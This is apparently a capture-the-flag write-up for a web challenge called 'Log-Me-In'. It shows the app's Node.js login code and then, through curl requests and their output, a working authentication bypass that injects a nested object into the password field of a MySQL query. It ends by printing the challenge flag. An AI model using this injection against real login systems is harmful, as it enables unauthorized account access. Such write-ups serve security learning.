# Log-Me-In
Category: Web

> Log in to get the flag

The following file was attached:

```javascript
/**
 * @fileoverview Description of this file.
 */

const mysql = require('mysql');
const express = require('express');
const cookieSession = require('cookie-session');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');

const flagValue = "..."
const targetUser = "michelle"

const {
  v4: uuidv4
} = require('uuid');

const app = express();
app.set('view engine', 'ejs');
app.set('strict routing', true);

/* strict routing to prevent /note/ paths etc. */
app.set('strict routing', true)
app.use(cookieParser());

/* secure session in cookie */
app.use(cookieSession({
  name: 'session',
  keys: ['...'] //don't even bother
}));

app.use(bodyParser.urlencoded({
  extended: true
}))

app.use(function(req, res, next) {
  if(req && req.session && req.session.username) {
    res.locals.username = req.session.username
    res.locals.flag = req.session.flag
  } else {
    res.locals.username = false
    res.locals.flag = false
  }
  next()
});

/* server static files from static folder */
app.use('/static', express.static('static'))

app.use(function( req, res, next) {
  if(req.get('X-Forwarded-Proto') == 'http') {
      res.redirect('https://' + req.headers.host + req.url)
  } else {
    if (process.env.DEV) {
      return next()
    } else  {
    return next()
    }
  }
});
// MIDDLEWARE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

/* csrf middleware, csrf_token stored in the session cookie */
const csrf = (req, res, next) => {
  const csrf = uuidv4();
  req.csrf = req.session.csrf || uuidv4();
  req.session.csrf = csrf;
  res.locals.csrf = csrf;

  nocache(res);

  if (req.method == 'POST' && req.csrf !== req.body.csrf) {
    return res.render('index', {error: 'Invalid CSRF token'});
  }

  next();
}

/* disable cache on specifc endpoints */
const nocache = (res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
}

/* auth middleware */
const auth = (req, res, next) => {
  if (!req.session || !req.session.username) {
    return res.render('index', {error:"You must be logged in to access that"});
  }
  next()
}

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
app.get('/logout', (req, res) => {
  req.session = null;
  res.redirect('/');
});


app.get('/', csrf, (req, res) => {
  res.render('index');
});

app.get('/about', (req, res) => {
  res.render('about');

});
app.get('/me', auth, (req, res) => {
  res.render('profile');
});

app.get('/flag', csrf, auth, (req, res) => {
  res.render('premium')
});

app.get('/login', (req, res) => {
  res.render('login');
});

app.post('/login', (req, res) => {
  const u = req.body['username'];
  const p = req.body['password'];

  const con = DBCon(); // mysql.createConnection(...).connect()

  const sql = 'Select * from users where username = ? and password = ?';
  con.query(sql, [u, p], function(err, qResult) {
    if(err) {
      res.render('login', {error: `Unknown error: ${err}`});
    } else if(qResult.length) {
      const username = qResult[0]['username'];
      let flag;
      if(username.toLowerCase() == targetUser) {
        flag = flagValue
      } else{
        flag = "<span class=text-danger>Only Michelle's account has the flag</span>";
      }
      req.session.username = username
      req.session.flag = flag
      res.redirect('/me');
    } else {
      res.render('login', {error: "Invalid username or password"})
    }
  });
});

/*
 * ...SNIP...
 */

```

## Solution

This is a simple node.js application which offers not much more than a login page. However, we need to login as "Michelle" if we want to get the flag.

At first I thought this must be a prototype pollution challenge, targeting:
```javascript
if(username.toLowerCase() == targetUser) {
    flag = flagValue
}
```

If we could pollute the `object` prototype and override `toLowerCase` with logic of our own, we would be able to return "michelle" instead of the actual lower case. But first, we need to find a way to log in with some username in order to pass the `qResult.length` check.

Luckily, `admin:admin` did the trick:

```console
root@kali:/media/sf_CTFs/google/logmein# curl 'https://log-me-in.web.ctfcompetition.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "username=admin&password=admin" && echo
Found. Redirecting to /me
```

However, I wasn't able to find a way to pollute the prototype and override `toLowerCase`. Eventually I moved on to try other things, such as sending the same parameter twice with different values:

```console
root@kali:/media/sf_CTFs/google/logmein# curl 'https://log-me-in.web.ctfcompetition.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "username=admin&password=admin&username=michelle" -s | grep ERROR
                <p>Unknown error: Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39; &#39;michelle&#39; and password = &#39;admin&#39; order by id&#39; at line 1</p>
```

This gave out an SQL error, proving that we are able to meddle with the SQL query.

The next thing I tried was the *extended* syntax of `body-parser`, which `allows for rich objects and arrays to be encoded into the URL-encoded format`. It worked for [Pasteurize](Pasteurize.md) after all.

```console
root@kali:/media/sf_CTFs/google/logmein# curl 'https://log-me-in.web.ctfcompetition.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "username=admin&password[test]=admin" -s | grep
ERROR
                <p>Unknown error: Error: ER_BAD_FIELD_ERROR: Unknown column &#39;test&#39; in &#39;where clause&#39;</p>
```

`Unknown column 'test'`? This looks really promising. Next thing to try is:

```console
root@kali:/media/sf_CTFs/google/logmein# curl 'https://log-me-in.web.ctfcompetition.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "username=michelle&password[username]=admin" -s
Found. Redirecting to /me
```

Looks like we were able to log in! Let's check the cookie:

```console
root@kali:/media/sf_CTFs/google/logmein# curl 'https://log-me-in.web.ctfcompetition.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "username=michelle&password[username]=admin" -s -v 2>&1 | grep cookie
< set-cookie: session=eyJ1c2VybmFtZSI6Im1pY2hlbGxlIiwiZmxhZyI6IkNURnthLXByZW1pdW0tZWZmb3J0LWRlc2VydmVzLWEtcHJlbWl1bS1mbGFnfSJ9; path=/; httponly
< set-cookie: session.sig=bm5eHrmgRjBNmerS49mKNDV_tP4; path=/; httponly
root@kali:/media/sf_CTFs/google/logmein# echo eyJ1c2VybmFtZSI6Im1pY2hlbGxlIiwiZmxhZyI6IkNURnthLXByZW1pdW0tZWZmb3J0LWRlc2VydmVzLWEtcHJlbWl1bS1mbGFnfSJ9 | base64 -d
{"username":"michelle","flag":"CTF{a-premium-effort-deserves-a-premium-flag}"}
```

The flag: `CTF{a-premium-effort-deserves-a-premium-flag}`